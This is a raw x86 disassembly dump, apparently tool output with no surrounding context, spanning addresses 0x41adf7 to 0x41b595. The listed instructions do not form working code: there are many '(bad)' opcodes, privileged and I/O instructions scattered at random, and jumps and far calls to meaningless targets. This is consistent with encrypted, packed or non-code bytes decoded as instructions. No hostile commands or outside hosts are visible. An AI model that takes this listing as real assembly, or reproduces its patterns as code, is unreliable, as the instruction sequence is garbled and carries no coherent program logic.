  41adf7:	mov    BYTE PTR [edx+0x259af285],dl
  41adfd:	icebp  
  41adfe:	fbld   TBYTE PTR [ecx-0x17e06573]
  41ae04:	repz inc esi
  41ae06:	xchg   ch,bl
  41ae08:	mov    dl,BYTE PTR [edx+0x7f6cf2fa]
  41ae0e:	repnz mov dh,ah
  41ae11:	sti    
  41ae12:	and    al,0x47
  41ae14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae15:	sub    DWORD PTR [edx-0x2c47eb5f],0x16943429
  41ae1f:	lods   eax,DWORD PTR ds:[esi]
  41ae20:	lds    eax,FWORD PTR [ebx]
  41ae22:	or     esp,eax
  41ae24:	ret    
  41ae25:	idiv   DWORD PTR gs:[esi-0x3d]
  41ae29:	xchg   ebx,eax
  41ae2a:	adc    ah,BYTE PTR [eax-0x2]
  41ae2d:	sbb    BYTE PTR [ecx-0x708cc8a7],ah
  41ae33:	push   esp
  41ae34:	les    edi,FWORD PTR [esi]
  41ae36:	adc    DWORD PTR [esi-0x41daf8a],edx
  41ae3c:	stc    
  41ae3d:	push   0x22
  41ae3f:	ret    0xf05b
  41ae42:	inc    edi
  41ae43:	aam    0x1
  41ae45:	vpcmpgtd xmm6,xmm7,XMMWORD PTR [ebp+0x4c]
  41ae4a:	popf   
  41ae4b:	retf   
  41ae4c:	mov    bl,0x3c
  41ae4e:	dec    edx
  41ae4f:	bound  ebx,QWORD PTR [ebp-0x11]
  41ae52:	add    al,0x81
  41ae54:	pop    ecx
  41ae55:	(bad)  [ebp+0x5d]
  41ae58:	add    BYTE PTR [edi],bh
  41ae5a:	xchg   edx,eax
  41ae5b:	and    al,0x8
  41ae5d:	pop    ss
  41ae5e:	test   DWORD PTR [edx-0x77],0xd1bb9d61
  41ae65:	fstp   DWORD PTR [eax-0x5bfba178]
  41ae6b:	mov    esp,0x21d04eec
  41ae70:	(bad)  
  41ae71:	push   esp
  41ae72:	pop    edi
  41ae73:	lds    ebp,FWORD PTR [esi]
  41ae75:	mov    eax,0x169b08ee
  41ae7a:	inc    eax
  41ae7b:	sbb    eax,0xf6ab6537
  41ae80:	sbb    ch,BYTE PTR [eax+0x1d1da66d]
  41ae86:	lock xchg ebx,eax
  41ae88:	push   ds
  41ae89:	sub    edi,DWORD PTR [ecx+0x66743955]
  41ae8f:	cld    
  41ae90:	mov    eax,0x4af379e9
  41ae95:	adc    BYTE PTR [ecx+edx*2-0x534d3c0d],0x34
  41ae9d:	cwde   
  41ae9e:	mov    edi,0xf4b80e20
  41aea3:	test   DWORD PTR [edx-0x782081de],ebx
  41aea9:	repz aas 
  41aeab:	mov    bl,0x63
  41aead:	shl    DWORD PTR [edi],0xc7
  41aeb0:	out    dx,al
  41aeb1:	push   eax
  41aeb2:	imul   DWORD PTR [esi-0xa]
  41aeb5:	mov    eax,ds:0x7c04cc7f
  41aeba:	stos   BYTE PTR es:[edi],al
  41aebb:	leave  
  41aebc:	sbb    DWORD PTR [edi],ebx
  41aebe:	mov    BYTE PTR ds:0x6108cea,ah
  41aec4:	jnp    0x41ae8a
  41aec6:	fld    QWORD PTR [edx-0x78]
  41aec9:	out    dx,eax
  41aeca:	js     0x41ae6d
  41aecc:	jg     0x41aeb7
  41aece:	xlat   BYTE PTR ds:[ebx]
  41aecf:	or     ebx,DWORD PTR [eax]
  41aed1:	pop    ss
  41aed2:	push   eax
  41aed3:	sub    DWORD PTR [esi+0x28e80a84],ebx
  41aed9:	inc    ebx
  41aeda:	cdq    
  41aedb:	retf   
  41aedc:	pop    ebx
  41aedd:	enter  0xcdd9,0x80
  41aee1:	daa    
  41aee2:	fnstenv [ecx]
  41aee4:	aaa    
  41aee5:	inc    edx
  41aee6:	inc    edx
  41aee7:	push   esi
  41aee8:	(bad)  
  41aee9:	ret    
  41aeea:	cs jbe 0x41aee1
  41aeed:	pop    ebx
  41aeee:	cmp    al,0xec
  41aef0:	mov    eax,0xb760e0ce
  41aef5:	sbb    ebx,DWORD PTR [edx]
  41aef7:	into   
  41aef8:	push   ebx
  41aef9:	popf   
  41aefa:	pop    esp
  41aefb:	aaa    
  41aefc:	nop
  41aefd:	call   0xd3c001c2
  41af02:	scas   eax,DWORD PTR es:[edi]
  41af03:	pop    edx
  41af04:	ficomp WORD PTR [ebp-0x7d]
  41af07:	mov    eax,0xf4eaa228
  41af0c:	pop    ss
  41af0d:	jo     0x41af14
  41af0f:	shl    DWORD PTR [edi],0xd8
  41af12:	sub    bl,BYTE PTR [ebx]
  41af14:	mov    al,ds:0xc297c541
  41af19:	pop    ecx
  41af1a:	dec    esi
  41af1b:	xor    edi,DWORD PTR [ebx]
  41af1d:	outs   dx,DWORD PTR ds:[esi]
  41af1e:	(bad)  
  41af1f:	push   edx
  41af20:	mov    eax,0xcc80b5fb
  41af25:	mov    esp,edi
  41af27:	into   
  41af28:	pushf  
  41af29:	and    BYTE PTR [eax-0x56],cl
  41af2c:	lahf   
  41af2d:	and    BYTE PTR [edx-0x1a1c9bb9],0xa9
  41af34:	jmp    0x2aa3:0xff709023
  41af3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af3c:	imul   edi,DWORD PTR [edi-0x2d649dc9],0xefb9e347
  41af46:	fwait
  41af47:	pop    es
  41af48:	out    dx,al
  41af49:	dec    ebp
  41af4a:	(bad)  
  41af4b:	stos   BYTE PTR es:[edi],al
  41af4c:	lahf   
  41af4d:	pushf  
  41af4e:	neg    DWORD PTR [ebx+esi*8+0x2c]
  41af52:	cli    
  41af53:	mul    BYTE PTR [esi+0x228fbff1]
  41af59:	cmp    esi,DWORD PTR [ecx-0x1e8ee374]
  41af5f:	shr    BYTE PTR [eax+esi*1-0x19],1
  41af63:	pusha  
  41af64:	sbb    ch,BYTE PTR [eax-0x43]
  41af67:	push   ecx
  41af68:	dec    ecx
  41af69:	jnp    0x41af56
  41af6b:	sbb    al,0x30
  41af6d:	std    
  41af6e:	inc    ecx
  41af6f:	jae    0x41aef7
  41af71:	loop   0x41aef9
  41af73:	xchg   BYTE PTR [ecx],cl
  41af75:	push   ss
  41af76:	nop
  41af77:	aas    
  41af78:	pop    ebx
  41af79:	xor    BYTE PTR [edi],ah
  41af7b:	fld    QWORD PTR [eax]
  41af7d:	push   ebp
  41af7e:	icebp  
  41af7f:	int3   
  41af80:	add    eax,0xf3622c6
  41af85:	mov    ah,BYTE PTR ds:0xf9de21c8
  41af8b:	sub    al,0x3b
  41af8d:	call   0xeec1a97
  41af92:	push   ecx
  41af93:	add    DWORD PTR [esi],edx
  41af95:	test   eax,0x1b721d90
  41af9a:	mov    dl,0xca
  41af9c:	push   esi
  41af9d:	push   edx
  41af9e:	sbb    ch,BYTE PTR gs:[ebx+0xd]
  41afa2:	test   eax,0x17c8c32f
  41afa7:	cld    
  41afa8:	push   esp
  41afa9:	xlat   BYTE PTR ds:[ebx]
  41afaa:	stc    
  41afab:	or     DWORD PTR [eax],esp
  41afad:	fcomp  st(3)
  41afaf:	add    eax,0x739eb86e
  41afb4:	mov    eax,0x3a946f90
  41afb9:	out    0x67,al
  41afbb:	push   eax
  41afbc:	pop    edx
  41afbd:	test   eax,0x9cf90e63
  41afc2:	jle    0x41afb0
  41afc4:	into   
  41afc5:	mov    dl,0xce
  41afc7:	sbb    al,0x73
  41afc9:	test   dh,0xd
  41afcc:	adc    al,0x5b
  41afce:	sub    DWORD PTR [esi-0x40c3935e],ecx
  41afd4:	fsub   DWORD PTR [ebp+0x6d7b67f6]
  41afda:	js     0x41b00b
  41afdc:	pop    ebp
  41afdd:	retf   0xb902
  41afe0:	cmp    esp,DWORD PTR [edi]
  41afe2:	mov    eax,ds:0x5a938906
  41afe7:	sub    esi,DWORD PTR [edx]
  41afe9:	add    BYTE PTR ds:0x4e07859b,dh
  41afef:	sahf   
  41aff0:	sub    al,0x2a
  41aff2:	and    DWORD PTR [eax+0x7c9f045f],0x56a14e1b
  41affc:	stos   DWORD PTR es:[edi],eax
  41affd:	dec    esi
  41affe:	mov    esp,0xa376ff81
  41b003:	xor    al,0x33
  41b005:	cld    
  41b006:	push   cs
  41b007:	jae    0x41afc2
  41b009:	les    ebx,FWORD PTR [eax+0x2d67ce7e]
  41b00f:	push   ecx
  41b010:	aas    
  41b011:	es sub al,0xd9
  41b014:	daa    
  41b015:	inc    edx
  41b016:	out    0xf5,al
  41b018:	clc    
  41b019:	mov    eax,0x739fc2fc
  41b01e:	outs   dx,DWORD PTR ds:[esi]
  41b01f:	inc    edi
  41b020:	int3   
  41b021:	ins    DWORD PTR es:[edi],dx
  41b022:	pop    es
  41b023:	mov    ch,BYTE PTR [esi+0x48]
  41b026:	addr16 mov ebx,0x2353699a
  41b02c:	nop
  41b02d:	ret    
  41b02e:	pusha  
  41b02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b031:	mov    WORD PTR [ecx-0x11e45679],es
  41b037:	cmp    al,0x6b
  41b039:	mov    ds:0xd1298e4b,eax
  41b03e:	test   bh,al
  41b040:	jb     0x41b091
  41b042:	sub    al,0xbb
  41b044:	les    edx,FWORD PTR [ebp+0x2d0d217e]
  41b04a:	and    eax,0x16959460
  41b04f:	loop   0x41b074
  41b051:	lea    ecx,[edi+0xf66dd81]
  41b057:	dec    eax
  41b058:	inc    edi
  41b059:	jns    0x41b027
  41b05b:	je     0x41b04d
  41b05d:	cmp    al,0x5a
  41b05f:	adc    BYTE PTR [ebx+0x78],dl
  41b062:	shl    BYTE PTR [eax],1
  41b064:	in     al,0xc7
  41b066:	leave  
  41b067:	pop    ecx
  41b068:	dec    esi
  41b069:	jecxz  0x41b00e
  41b06b:	mov    dl,0xe6
  41b06d:	sbb    bh,dh
  41b06f:	jecxz  0x41b0ca
  41b071:	mov    ds:0xae73928e,al
  41b076:	push   cs
  41b077:	lods   eax,DWORD PTR ds:[esi]
  41b078:	daa    
  41b079:	(bad)  
  41b07a:	mov    ds:0x52e43c20,al
  41b07f:	sbb    dl,BYTE PTR [eax-0x5ce6fb28]
  41b085:	cmc    
  41b086:	mov    edx,0x50cdb6ad
  41b08b:	aad    0xe6
  41b08d:	popf   
  41b08e:	(bad)  
  41b08f:	iret   
  41b090:	das    
  41b091:	xchg   edx,eax
  41b092:	xchg   edi,eax
  41b093:	jg     0x41b069
  41b095:	sub    ah,BYTE PTR [edx+0x6e]
  41b098:	or     bl,al
  41b09a:	inc    ebp
  41b09b:	dec    edx
  41b09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b09d:	pop    eax
  41b09e:	mov    ds:0x10699756,al
  41b0a3:	mov    ch,0x1
  41b0a5:	jecxz  0x41b0f1
  41b0a7:	push   edx
  41b0a8:	sti    
  41b0a9:	(bad)  
  41b0aa:	fwait
  41b0ab:	inc    ebp
  41b0ac:	imul   edx,DWORD PTR [ebx+0x191e26de],0xffffffce
  41b0b3:	in     eax,0x7e
  41b0b5:	lahf   
  41b0b6:	push   es
  41b0b7:	(bad)  
  41b0b9:	ins    BYTE PTR es:[edi],dx
  41b0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0bb:	pop    ds
  41b0bc:	aad    0xc1
  41b0be:	fist   WORD PTR [edx+0x48]
  41b0c1:	gs aas 
  41b0c3:	popf   
  41b0c4:	push   edx
  41b0c5:	ds addr16 fcmovb st,st(2)
  41b0c9:	hlt    
  41b0ca:	add    eax,edx
  41b0cc:	and    ebx,ecx
  41b0ce:	(bad)  
  41b0cf:	jp     0x41b139
  41b0d1:	sar    DWORD PTR [edx-0x47],cl
  41b0d4:	adc    al,0xac
  41b0d6:	sub    al,0xe0
  41b0d8:	and    esi,DWORD PTR [edx]
  41b0da:	mov    esp,0xf35d6672
  41b0df:	scas   eax,DWORD PTR es:[edi]
  41b0e0:	mov    ch,dl
  41b0e2:	fsubr  QWORD PTR [ebx+0x68e8bbbc]
  41b0e8:	gs adc esp,edi
  41b0eb:	hlt    
  41b0ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0ed:	push   es
  41b0ee:	pushf  
  41b0ef:	push   ebp
  41b0f0:	imul   esp,DWORD PTR [edi-0x23],0xee86b70d
  41b0f7:	add    ah,BYTE PTR [ebp+0x5a]
  41b0fa:	call   0x6ac5ec07
  41b0ff:	repz shr bl,0x65
  41b103:	call   0xe638:0xf89c7920
  41b10a:	cmove  ecx,DWORD PTR [ebx-0x684d3067]
  41b111:	adc    DWORD PTR [ebp-0x96027c1],0xe278ca08
  41b11b:	imul   BYTE PTR [ecx-0x4cbe1833]
  41b121:	cmp    BYTE PTR [eax+0x2ffa29a9],cl
  41b127:	out    dx,al
  41b128:	mov    bl,0x34
  41b12a:	cmp    DWORD PTR [edx-0x29],esi
  41b12d:	jbe    0x41b14c
  41b12f:	scas   eax,DWORD PTR es:[edi]
  41b130:	or     al,0x81
  41b132:	mov    esi,0x5e0d5a56
  41b137:	jb     0x41b1a2
  41b139:	leave  
  41b13a:	out    0x36,al
  41b13c:	(bad)  
  41b13d:	test   al,0x74
  41b13f:	out    dx,eax
  41b140:	dec    edx
  41b141:	(bad)  
  41b142:	or     bh,BYTE PTR [ebp+0xe]
  41b145:	mov    ebx,DWORD PTR [edi]
  41b147:	add    bh,BYTE PTR [ebp+0x39cc6bab]
  41b14d:	add    BYTE PTR [eax],al
  41b14f:	add    BYTE PTR [eax],al
  41b151:	add    ah,bh
  41b153:	es out dx,eax
  41b155:	mov    eax,ds:0x7ffee9ff
  41b15a:	jmp    edx
  41b15c:	fdivp  st(6),st
  41b15e:	mov    bh,0xba
  41b160:	mov    edx,0x12d8fd5
  41b165:	add    bl,dh
  41b167:	add    al,0x0
  41b169:	add    BYTE PTR [ecx-0x18],cl
  41b16c:	aad    0x58
  41b16e:	jb     0x41b196
  41b170:	cmp    eax,0x5a569852
  41b175:	adc    BYTE PTR [eax+0x42],0xa7
  41b179:	push   edi
  41b17a:	mov    dl,0xec
  41b17c:	and    ah,BYTE PTR [eax+0x53f8246]
  41b182:	add    DWORD PTR [ecx+ebx*1],ebx
  41b185:	xor    eax,0xc1144372
  41b18a:	(bad)  
  41b18b:	sbb    BYTE PTR [eax],bh
  41b18d:	mov    esp,0x1b031181
  41b192:	iret   
  41b193:	mov    ebp,0x590d1c71
  41b198:	jg     0x41b12d
  41b19a:	int3   
  41b19b:	mov    ecx,0x1976c1ca
  41b1a0:	jne    0x41b159
  41b1a2:	or     al,0xb3
  41b1a4:	imul   esp,eax,0x6
  41b1a7:	shl    BYTE PTR [eax-0x78aeff31],0xa6
  41b1ae:	repnz dec ebp
  41b1b0:	stos   BYTE PTR es:[edi],al
  41b1b1:	ret    0xb945
  41b1b4:	pushf  
  41b1b5:	inc    edi
  41b1b6:	sahf   
  41b1b7:	pop    edx
  41b1b8:	ret    0x38b2
  41b1bb:	dec    ecx
  41b1bc:	fwait
  41b1bd:	out    0x8b,eax
  41b1bf:	push   ebx
  41b1c0:	jmp    0x774b6355
  41b1c5:	lock test DWORD PTR [edi],ebp
  41b1c8:	retf   0x7c2e
  41b1cb:	adc    eax,0x217294ae
  41b1d0:	daa    
  41b1d1:	idiv   BYTE PTR [ecx+0x5c1ea125]
  41b1d7:	xchg   ebp,eax
  41b1d8:	sub    BYTE PTR [ecx+0x3b756cb],al
  41b1de:	inc    esp
  41b1df:	mov    esp,0xae207bb3
  41b1e4:	inc    ebx
  41b1e5:	and    eax,0x314a5aa3
  41b1ea:	ret    
  41b1eb:	push   esp
  41b1ec:	mov    al,ds:0x22580012
  41b1f1:	in     al,0x4f
  41b1f3:	aad    0xcc
  41b1f5:	scas   eax,DWORD PTR es:[edi]
  41b1f6:	(bad)  
  41b1f7:	test   eax,0xe02d0623
  41b1fc:	jmp    0xa2cb:0xcaa313c4
  41b203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b204:	cmp    esi,esp
  41b206:	sbb    BYTE PTR [edi-0x7b39248d],dh
  41b20c:	outs   dx,DWORD PTR ds:[esi]
  41b20d:	pop    ebp
  41b20e:	test   BYTE PTR [ebx+0x7f9e95c7],0xa4
  41b215:	pop    esp
  41b216:	inc    esp
  41b217:	mov    esp,0x90e4c7fc
  41b21c:	fwait
  41b21d:	jl     0x41b1d7
  41b21f:	pushf  
  41b220:	mov    al,0xbb
  41b222:	mov    dl,0xaa
  41b224:	(bad)  
  41b225:	fs dec edi
  41b227:	sub    eax,ebp
  41b229:	loopne 0x41b21e
  41b22b:	push   esi
  41b22c:	cli    
  41b22d:	retf   0xe26b
  41b230:	xor    BYTE PTR [esi*8+0x9c5c5d4],0xf3
  41b238:	push   ebx
  41b239:	out    dx,eax
  41b23a:	add    ah,BYTE PTR [ecx+0x39c0a8a7]
  41b240:	push   es
  41b241:	sbb    eax,0x38403877
  41b246:	retf   0x7dd7
  41b249:	scas   al,BYTE PTR es:[edi]
  41b24a:	iret   
  41b24b:	cmp    edi,ecx
  41b24d:	sub    BYTE PTR [edi+0x26ba80dd],dl
  41b253:	dec    ecx
  41b254:	xor    al,cl
  41b256:	stos   DWORD PTR es:[edi],eax
  41b257:	in     al,dx
  41b258:	push   ss
  41b259:	fsubr  st,st(1)
  41b25b:	mov    esp,0x979c6271
  41b260:	adc    DWORD PTR [edi-0x10],ebx
  41b263:	les    ebx,FWORD PTR [edi+ebp*4+0x6faf1b9d]
  41b26a:	cmp    al,0x90
  41b26c:	out    0x94,al
  41b26e:	dec    edx
  41b26f:	and    al,0x13
  41b271:	and    bh,BYTE PTR [edx+0x14]
  41b274:	rol    DWORD PTR [ecx+0x56],0xde
  41b278:	cwde   
  41b279:	add    al,0x1b
  41b27b:	sbb    bl,BYTE PTR [edx-0x514d1b0d]
  41b281:	psubq  mm5,QWORD PTR [ecx+0x1e]
  41b285:	pop    ebp
  41b286:	mov    eax,ds:0x13b54b51
  41b28b:	inc    eax
  41b28c:	call   0x891411d2
  41b291:	cmp    eax,0x8a8a5067
  41b296:	cmp    dl,bl
  41b298:	push   edx
  41b299:	out    dx,eax
  41b29a:	push   0x2a
  41b29c:	(bad)  
  41b29d:	adc    bl,BYTE PTR [edi]
  41b29f:	add    esi,ecx
  41b2a1:	data16 and al,0xf2
  41b2a4:	ss sbb ecx,eax
  41b2a7:	xchg   edx,eax
  41b2a8:	fwait
  41b2a9:	ds xchg ebp,eax
  41b2ab:	pushf  
  41b2ac:	int3   
  41b2ad:	mov    esp,0xb7afc6fa
  41b2b2:	outs   dx,BYTE PTR ds:[esi]
  41b2b3:	add    dl,BYTE PTR [ebx+0x68]
  41b2b6:	cdq    
  41b2b7:	mov    ecx,0x8f6925ed
  41b2bc:	cwde   
  41b2bd:	adc    ah,BYTE PTR [eiz*8+0x2e59b794]
  41b2c4:	aaa    
  41b2c5:	leave  
  41b2c6:	sub    BYTE PTR [eax+0x6c137654],cl
  41b2cc:	stc    
  41b2cd:	adc    DWORD PTR [ecx+0x7b],edx
  41b2d0:	sbb    eax,esi
  41b2d2:	push   edi
  41b2d3:	cmp    eax,eax
  41b2d5:	xor    ch,BYTE PTR [ebx+0x67]
  41b2d8:	rcl    BYTE PTR [ebx],0x88
  41b2db:	xchg   BYTE PTR [esi+edi*2-0xf4d1323],al
  41b2e2:	ror    edi,0x4d
  41b2e5:	mov    edi,0x50992501
  41b2ea:	xchg   esp,eax
  41b2eb:	pop    edi
  41b2ec:	scas   al,BYTE PTR es:[edi]
  41b2ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2ee:	iret   
  41b2ef:	(bad)  
  41b2f0:	test   BYTE PTR [esi+eax*8+0x57],0xf
  41b2f5:	adc    BYTE PTR [eax+ebx*4],al
  41b2f8:	jne    0x41b29f
  41b2fa:	es pop eax
  41b2fc:	push   ds
  41b2fd:	(bad)  
  41b2fe:	lds    eax,FWORD PTR [esi]
  41b300:	daa    
  41b301:	jl     0x41b295
  41b303:	mov    bh,0x5d
  41b305:	push   cs
  41b306:	call   DWORD PTR [edx+0x3b]
  41b309:	dec    ebx
  41b30a:	and    cl,BYTE PTR ds:0xd1a41bf
  41b310:	push   0xaaa93311
  41b315:	aad    0x3a
  41b317:	push   esp
  41b318:	jne    0x41b33c
  41b31a:	test   eax,0x63ad292f
  41b31f:	or     DWORD PTR fs:[edi-0x34aa7b97],ebx
  41b326:	pop    esp
  41b327:	xor    BYTE PTR [ebx],al
  41b329:	mov    al,ds:0x32c847c9
  41b32e:	xor    ah,dh
  41b330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b331:	int    0x72
  41b333:	repz dec edx
  41b335:	fcom   QWORD PTR [eax+0x6c]
  41b338:	fiadd  WORD PTR [ebx]
  41b33a:	push   cs
  41b33b:	mov    ch,0xb1
  41b33d:	popa   
  41b33e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b33f:	hlt    
  41b340:	fst    DWORD PTR [edi+eax*1+0x1bdacdf5]
  41b347:	xor    cl,BYTE PTR [ecx+esi*2]
  41b34a:	(bad)  
  41b34b:	aam    0x18
  41b34d:	add    dl,dh
  41b34f:	or     eax,0xb413c59a
  41b354:	add    al,0xf7
  41b356:	ins    DWORD PTR es:[edi],dx
  41b357:	jmp    0x3e94:0xe15e4541
  41b35e:	arpl   WORD PTR [ebp-0x42cd6044],bp
  41b364:	sbb    ch,BYTE PTR [edi-0x209ce00a]
  41b36a:	lds    esp,FWORD PTR [edx-0x44d79706]
  41b370:	dec    ecx
  41b371:	(bad)  
  41b372:	add    al,0x5b
  41b374:	xchg   ecx,eax
  41b375:	dec    eax
  41b376:	mov    esp,0x1d72f01f
  41b37b:	hlt    
  41b37c:	aad    0xe0
  41b37e:	push   eax
  41b37f:	ficom  WORD PTR [eax+0x58e5fae4]
  41b385:	loopne 0x41b3d2
  41b387:	jbe    0x41b368
  41b389:	mov    eax,ds:0x5366de43
  41b38e:	stc    
  41b38f:	out    dx,al
  41b390:	jo     0x41b320
  41b392:	adc    eax,0xbcc90261
  41b397:	aad    0x3b
  41b399:	jb     0x41b352
  41b39b:	shl    DWORD PTR [ebp+0x6106c669],cl
  41b3a1:	popa   
  41b3a2:	xor    eax,0x1e42db9
  41b3a7:	(bad)  
  41b3a8:	cmp    bl,ah
  41b3aa:	lods   eax,DWORD PTR ds:[esi]
  41b3ab:	imul   esi,DWORD PTR [ebp+0x3589a028],0x6c
  41b3b2:	mov    esi,0x21b70d6b
  41b3b7:	sub    DWORD PTR ds:0xcffa1f42,esp
  41b3bd:	fs dec ecx
  41b3bf:	inc    edx
  41b3c0:	fidivr DWORD PTR [ecx]
  41b3c2:	jg     0x41b3de
  41b3c4:	mov    ah,0x48
  41b3c6:	call   0xa6e2:0xfb349bf5
  41b3cd:	fnstcw WORD PTR [ecx-0x7b7e2be4]
  41b3d3:	or     ebx,edi
  41b3d5:	push   eax
  41b3d6:	adc    BYTE PTR [edi],ch
  41b3d8:	xlat   BYTE PTR ds:[ebx]
  41b3d9:	clc    
  41b3da:	jo     0x41b3e8
  41b3dc:	and    eax,eax
  41b3de:	and    dh,BYTE PTR [esi-0x9]
  41b3e1:	in     eax,dx
  41b3e2:	pop    ecx
  41b3e3:	pop    es
  41b3e4:	inc    edx
  41b3e5:	mov    cl,0xc1
  41b3e7:	xor    BYTE PTR [edx],dl
  41b3e9:	push   edi
  41b3ea:	dec    ecx
  41b3eb:	adc    dh,BYTE PTR [edx-0x39]
  41b3ee:	xchg   edx,eax
  41b3ef:	xchg   edi,eax
  41b3f0:	in     al,dx
  41b3f1:	repz push es
  41b3f3:	xor    BYTE PTR ds:0x8fee7d1e,0x4
  41b3fa:	icebp  
  41b3fb:	pop    ecx
  41b3fc:	mov    ch,0x84
  41b3fe:	inc    ebx
  41b3ff:	mov    edi,0x8f35ea2
  41b404:	lds    eax,FWORD PTR [esi+0x4b]
  41b407:	imul   ebx,DWORD PTR [edi-0x67a93998],0xffffffb8
  41b40e:	or     BYTE PTR ds:0xa3e6abf3,dl
  41b414:	shl    BYTE PTR [edi+0x57e4de5a],0x67
  41b41b:	mov    BYTE PTR ss:[edi],0x41
  41b41f:	lea    ebp,[eax+edx*8]
  41b422:	imul   esp,DWORD PTR [esi-0x5a48b173],0x30
  41b429:	add    eax,0x1c22b4a4
  41b42e:	daa    
  41b42f:	jae    0x41b458
  41b431:	push   esi
  41b432:	imul   ebp,DWORD PTR [ebx],0x27
  41b435:	pop    DWORD PTR [ebx]
  41b437:	cmp    edx,DWORD PTR [ebp+0x147f94b9]
  41b43d:	shl    DWORD PTR [ebx+0x4e],0x35
  41b441:	sbb    BYTE PTR [edi+0x54],al
  41b444:	inc    esp
  41b445:	xor    al,0x1c
  41b447:	mov    esp,0x6e84d4b4
  41b44c:	xchg   esp,eax
  41b44d:	xor    eax,0xec6c0ffb
  41b452:	(bad)  
  41b453:	jns    0x41b408
  41b455:	(bad)  
  41b456:	in     eax,0x99
  41b458:	cmp    eax,0x570e15c
  41b45d:	imul   esi,DWORD PTR [bx+di+0x17],0xffffff80
  41b462:	push   ss
  41b463:	addr16 push ecx
  41b465:	out    dx,al
  41b466:	and    DWORD PTR [esi],eax
  41b468:	test   BYTE PTR [edx+0x4e],ch
  41b46b:	pushf  
  41b46c:	inc    esp
  41b46d:	out    dx,eax
  41b46e:	jmp    0x913cdb72
  41b473:	fwait
  41b474:	mov    WORD PTR [edi-0x4eb90259],gs
  41b47a:	in     al,0x23
  41b47c:	stos   BYTE PTR es:[edi],al
  41b47d:	jecxz  0x41b4b4
  41b47f:	mov    DWORD PTR [eax],eax
  41b481:	int3   
  41b482:	adc    ebp,DWORD PTR [ebp+edi*2+0x8]
  41b486:	xor    eax,0xc782d2f6
  41b48b:	jle    0x41b4e5
  41b48d:	or     eax,0xbc6abf78
  41b492:	push   ebp
  41b493:	mov    eax,0xf68ba683
  41b498:	fwait
  41b499:	push   ebp
  41b49a:	(bad)  
  41b49b:	dec    ebp
  41b49c:	mov    ecx,0x2b649713
  41b4a1:	mov    ebp,0x6b9a5c70
  41b4a6:	lods   eax,DWORD PTR ds:[esi]
  41b4a7:	pop    es
  41b4a8:	scas   al,BYTE PTR es:[edi]
  41b4a9:	mov    ah,0x79
  41b4ab:	xor    BYTE PTR [ebx-0x6c9267b4],dl
  41b4b1:	cdq    
  41b4b2:	mov    ds:0xce75b4bf,eax
  41b4b7:	pop    es
  41b4b8:	inc    eax
  41b4b9:	call   0x47d9d8f7
  41b4be:	int    0x91
  41b4c0:	sbb    al,0xc0
  41b4c2:	sub    BYTE PTR [edx+0x71],dl
  41b4c5:	push   ss
  41b4c6:	xchg   esp,eax
  41b4c7:	test   BYTE PTR [ebp-0x6a],al
  41b4ca:	mov    ecx,0x7feb448c
  41b4cf:	or     ebp,DWORD PTR [ecx-0x2e]
  41b4d2:	loopne 0x41b497
  41b4d4:	retf   0x82f7
  41b4d7:	fs ss int 0x42
  41b4db:	inc    ebx
  41b4dc:	inc    edi
  41b4dd:	mov    ecx,0xff0fb974
  41b4e2:	and    ah,BYTE PTR [esi-0x6d]
  41b4e5:	ja     0x41b46d
  41b4e7:	add    eax,0xdc719eda
  41b4ec:	cli    
  41b4ed:	and    BYTE PTR [esi],ch
  41b4ef:	jle    0x41b518
  41b4f1:	daa    
  41b4f2:	sub    BYTE PTR [eax+0x32],0x76
  41b4f6:	xchg   edx,eax
  41b4f7:	pop    es
  41b4f8:	outs   dx,BYTE PTR ds:[esi]
  41b4f9:	test   dl,al
  41b4fb:	sub    al,ch
  41b4fd:	xchg   esi,eax
  41b4fe:	ret    
  41b4ff:	cld    
  41b500:	pop    es
  41b501:	or     edi,DWORD PTR [ecx+eiz*4+0x6c]
  41b505:	dec    ebp
  41b506:	in     al,0x4c
  41b508:	mov    cl,0xb1
  41b50a:	mov    ds:0x6d563ce5,eax
  41b50f:	rcl    eax,cl
  41b511:	sub    al,dl
  41b513:	test   al,0x61
  41b515:	jnp    0x41b571
  41b517:	into   
  41b518:	in     eax,0x5a
  41b51a:	jl     0x41b4b0
  41b51c:	push   es
  41b51d:	sbb    DWORD PTR [ebx+0x2e81725e],ebx
  41b523:	mov    eax,ds:0xc69e3b7e
  41b528:	pop    esi
  41b529:	int    0x77
  41b52b:	das    
  41b52c:	loopne 0x41b4ea
  41b52e:	xor    BYTE PTR [esi],ah
  41b530:	dec    esp
  41b531:	(bad)  
  41b532:	mov    edx,0xfbb7b93b
  41b537:	push   edx
  41b538:	repnz stc 
  41b53a:	fldenv ds:0x1cf72769
  41b540:	lock nop
  41b542:	mov    eax,DWORD PTR [eax+ecx*4]
  41b545:	cmp    eax,0xa39ba756
  41b54a:	repnz fst DWORD PTR [edx+0x68734e99]
  41b551:	shl    BYTE PTR [ecx],0x92
  41b554:	jb     0x41b4d9
  41b556:	mov    cl,0x5d
  41b558:	push   edi
  41b559:	imul   DWORD PTR [eax+0x6bf6ff3e]
  41b55f:	mov    edi,0x380f7ca9
  41b564:	(bad)  
  41b565:	dec    eax
  41b566:	push   ecx
  41b567:	inc    ebx
  41b568:	cmp    eax,0xd5cb1924
  41b56d:	xlat   BYTE PTR ds:[ebx]
  41b56e:	sbb    dl,dl
  41b570:	imul   ecx,esp,0x9ad6a17
  41b576:	adc    DWORD PTR [edi],esi
  41b578:	mov    WORD PTR [ecx],?
  41b57a:	jmp    0x41b5dc
  41b57c:	push   ebx
  41b57d:	sbb    DWORD PTR [esi-0x6d],0xb615e197
  41b584:	loope  0x41b5f7
  41b586:	xchg   ecx,eax
  41b587:	mov    dh,0x43
  41b589:	jnp    0x41b5b7
  41b58b:	in     eax,0xd7
  41b58d:	mov    bl,0x17
  41b58f:	pushf  
  41b590:	mov    edi,0xd1cd80cf
  41b595:	xchg   edx,eax
